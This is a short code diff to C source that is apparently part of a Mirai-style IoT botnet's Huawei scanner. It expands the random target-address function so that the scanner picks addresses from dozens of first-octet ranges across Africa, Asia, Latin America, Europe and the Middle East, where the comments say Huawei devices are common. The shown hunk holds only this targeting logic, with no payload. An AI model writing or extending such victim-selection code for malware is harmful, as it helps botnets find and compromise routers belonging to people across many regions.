@@ -125,19 +125,39 @@ void huawei_scanner_init(void) {
 
 static ipv4_t get_random_ip_huawei(void) {
     ipv4_t addr;
-    
+
     while (TRUE) {
         addr = rand_next();
-        
+
         /* Target specific ranges where Huawei devices are common */
         uint8_t first_octet = (addr >> 24) & 0xFF;
-        
-        /* Africa and Middle East ranges */
-        if (first_octet == 157 || first_octet == 197 || first_octet == 41) {
+
+        /* Africa, Middle East, Asia, and Latin America ranges */
+        if (first_octet == 157 || first_octet == 197 || first_octet == 41 ||  /* Africa */
+            first_octet == 46 || first_octet == 47 || first_octet == 48 ||    /* Middle East */
+            first_octet == 49 || first_octet == 50 || first_octet == 51 ||    /* Middle East/Asia */
+            first_octet == 58 || first_octet == 59 || first_octet == 60 ||    /* Asia */
+            first_octet == 61 || first_octet == 62 || first_octet == 63 ||    /* Asia/Middle East */
+            first_octet == 103 || first_octet == 104 || first_octet == 105 || /* Asia/Africa */
+            first_octet == 106 || first_octet == 107 || first_octet == 108 || /* Asia/LatAm */
+            first_octet == 109 || first_octet == 110 || first_octet == 111 || /* Asia */
+            first_octet == 175 || first_octet == 176 || first_octet == 177 || /* Asia/LatAm */
+            first_octet == 178 || first_octet == 179 || first_octet == 180 || /* Asia/Middle East */
+            first_octet == 181 || first_octet == 182 || first_octet == 183 || /* Asia */
+            first_octet == 184 || first_octet == 185 || first_octet == 186 || /* LatAm/Middle East */
+            first_octet == 187 || first_octet == 188 || first_octet == 189 || /* LatAm/Asia */
+            first_octet == 190 || first_octet == 191 || first_octet == 192 || /* LatAm */
+            first_octet == 193 || first_octet == 194 || first_octet == 195 || /* Europe/Africa */
+            first_octet == 196 || first_octet == 198 || first_octet == 199 || /* Africa/US */
+            first_octet == 200 || first_octet == 201 || first_octet == 202 || /* LatAm/Asia */
+            first_octet == 203 || first_octet == 210 || first_octet == 211 || /* Asia */
+            first_octet == 212 || first_octet == 213 || first_octet == 217 || /* Europe/Middle East */
+            first_octet == 218 || first_octet == 219 || first_octet == 220 || /* Asia */
+            first_octet == 221 || first_octet == 222 || first_octet == 223) { /* Asia */
             break;
         }
     }
-    
+
     return addr;
 }
 
